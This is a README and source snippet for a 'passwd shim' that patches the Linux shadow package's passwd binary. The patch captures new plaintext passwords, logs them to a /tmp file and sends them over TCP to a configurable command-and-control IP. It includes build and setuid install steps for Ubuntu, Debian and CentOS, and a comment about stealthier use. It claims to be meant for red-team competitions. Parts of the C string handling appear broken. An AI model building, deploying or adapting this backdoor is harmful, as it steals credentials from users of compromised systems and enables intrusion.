# Retreiver Passwd Shim

#### What is this
This is a basic Linux binary shim on the passwd binary from the shadow package. This will grab new passwords while they are still plaintext in the binary and remotely send it back to a C2. It will also write to a file in the /tmp directory as a failover method. 

#### What does it work on? (Tested)

Ubuntu - 18.04, 20.04 <br />  
Centos - 8 <br />  
Debian - 11 <br />  

#### What is this intended for 
This is intended for Red Teaming in a Competition environment.


## Installation Instructions
#### Ubuntu - 18.04 / 20.04
1. clone shadow git
2. sudo apt-get build-dep shadow
3. run ./autogen.sh
4. Add Hook (See Hooking passwd.c)
5. sudo make all
6. sudo chmod 4755 passwd

#### Debian - 11
1. clone shadow git
2. sudo apt-get build-dep shadow
3. run ./autogen.sh
4. Add Hook (See Hooking passwd.c)
5. sudo make all
6. sudo chmod 4755 passwd

#### CentOS - 8
1. clone shadow git
2. yum deplist passwd | awk '/provider:/ {print $2}' | sort -u | xargs yum -y install
3. yum install -y autoconf gettext-devel automake 
4. dnf group install "Development Tools"
5. run ./autogen.sh --without-selinux
6. Add Hook (See Hooking passwd.c)
7. sudo make all
6. sudo chmod 4755 passwd

#### Troubleshooting
1. Try "make clean" if you are not getting the changed code
2. Building from apt-source kinda sucks don't do it if you don't have to


## Hooking the passwd.c file

#### At the Top
Imports needed 

    #include <sys/socket.h> 
    #include <arpa/inet.h> 
    #include <unistd.h> 
    #include <string.h> 

Definitions

    #define PORT <port> 
    #define IP "<ip_address>" 


#### Adding the Hook
At line number ~266, right above the code that will salt the password, we add a line to run the function. 

    /* Hook to grab password */
	writetofile(pass);

    /*
	 * Encrypt the password, then wipe the cleartext password.
	 */
	salt = crypt_make_salt (NULL, NULL);

    

#### Adding the Function 

At line ~210 right above the new_password function is where I put this function although it just needs to be above where it is called. 

    int writetofile (char *password){

        // Get UID
        uid_t uid = geteuid();
        struct passwd * pw = getpwuid(uid);
        
        // Create File + Variables
        FILE * fptr;
        fptr = fopen("/tmp/18432443.tmp", "a"); // Remove for ultra sneak
        char * user;
        char * msg;
        char * msg2;
        char * colon;

        // Write Shit
        if (pw) {
            user = pw->pw_name;
        }
        else {
            user = "unknown";
        }

        if (fptr != NULL) {

            fprintf(fptr, "%s:%s\n", name, password);
            
            // Send Shit //
            // Make Socket
            int sock = 0, valread;
            struct sockaddr_in serv_addr;
            
            // Build String
            strcpy(user, name);
            msg = ("%s", password);
            msg2 = ("%s:", user);
            colon = ':';
            strncat(msg2, &colon, 1);
            strcat(msg2, msg);

            char buffer[1024] = {0};
            fclose(fptr);

            // Error Handling
            if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
                // printf("\n Socket creation error \n");
                return -1;
            }

            serv_addr.sin_family = AF_INET;
            serv_addr.sin_port = htons(PORT);
            
            struct timeval timeout;
            timeout.tv_sec = 3;
            timeout.tv_usec = 0;

            if (setsockopt (sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout) < 0)  {
                // puts("Setsockopt failed\n");
                return -1;
            }
            
            if (setsockopt (sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof timeout) < 0) {
                // puts("setsockopt failed\n");
            }


            // Error Handling
            if(inet_pton(AF_INET, IP, &serv_addr.sin_addr)<=0) {
                // puts("\nInvalid address/ Address not supported \n");
                return -1;
            }
            if (connect(sock, (struct sockaddr *)&serv_addr, sizeof(serv_addr)) < 0) {
                return -1;
            }

            // Send Message
            send(sock , msg2 , strlen(msg2) , 0 );
            return 0;
        }

        return 0;
    }
